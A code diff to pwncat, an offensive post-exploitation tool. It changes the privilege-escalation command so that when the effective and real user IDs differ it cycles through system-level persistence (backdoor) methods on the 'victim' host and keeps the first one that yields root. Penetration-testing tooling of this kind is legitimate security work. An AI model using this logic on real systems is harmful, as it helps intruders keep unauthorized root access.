@@ -10,6 +10,7 @@ from pwncat.commands.base import (
     StoreForAction,
 )
 from pwncat import util, privesc
+from pwncat.persist import PersistenceError
 from pwncat.util import State
 from colorama import Fore
 import argparse
@@ -155,30 +156,34 @@ class Command(CommandDefinition):
                 chain = pwncat.victim.privesc.escalate(args.user, args.max_depth)
 
                 ident = pwncat.victim.id
-                backdoor = False
                 if ident["euid"]["id"] == 0 and ident["uid"]["id"] != 0:
                     util.progress(
-                        "EUID != UID. installing backdoor to complete privesc"
+                        "mismatched euid and uid; attempting backdoor installation."
                     )
-                    try:
-                        pwncat.victim.privesc.add_backdoor()
-                        backdoor = True
-                    except privesc.PrivescError as exc:
-                        util.warn(f"backdoor installation failed: {exc}")
+                    for method in pwncat.victim.persist.available:
+                        if not method.system or not method.local:
+                            continue
+                        try:
+                            # Attempt to install this persistence method
+                            pwncat.victim.persist.install(method.name)
+                            if not method.escalate():
+                                # The escalation didn't work, remove it and try the next
+                                pwncat.victim.persist.remove(method.name)
+                                continue
+                            chain.append(
+                                (
+                                    f"{method.format()} ({Fore.CYAN}euid{Fore.RESET} correction)",
+                                    "exit",
+                                )
+                            )
+                            break
+                        except PersistenceError:
+                            continue
 
                 util.success("privilege escalation succeeded using:")
                 for i, (technique, _) in enumerate(chain):
                     arrow = f"{Fore.YELLOW}\u2ba1{Fore.RESET} "
                     print(f"{(i+1)*' '}{arrow}{technique}")
-
-                if backdoor:
-                    print(
-                        (
-                            f"{(len(chain)+1)*' '}{arrow}"
-                            f"{Fore.YELLOW}pwncat{Fore.RESET} backdoor"
-                        )
-                    )
-
                 pwncat.victim.reset()
                 pwncat.victim.state = State.RAW
             except privesc.PrivescError as exc:
